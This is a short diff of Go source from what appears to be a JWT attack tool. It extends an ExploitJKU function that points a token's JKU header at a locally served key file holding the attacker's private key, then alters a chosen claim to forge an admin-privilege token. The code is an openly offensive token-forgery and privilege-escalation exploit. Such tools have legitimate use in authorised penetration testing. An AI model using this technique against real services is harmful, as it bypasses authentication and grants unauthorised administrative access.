@@ -24,13 +24,19 @@ func LaunchServer(port int) {
 	http.ListenAndServe(":"+strconv.Itoa(port), nil)
 }
 
-func ExploitJKU(token *jwt.Token) string {
+func ExploitJKU(token *jwt.Token, userHeader string, userValue string) string {
 
 	//Change the value of the "JKU" header to set the path to our file containing our private key
 	newToken, err := ctrl.ChangeValue(token, "JKU", pathToJWKFile, true)
-
 	if err != nil {
 		fmt.Printf("An error ocurred while modifying the value of \"JWK\" header : %s \n", err)
+		return ""
+	}
+
+	//Change the value of the header to create the admin privs token
+	newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
+	if err != nil {
+		fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
 		return ""
 	}
 
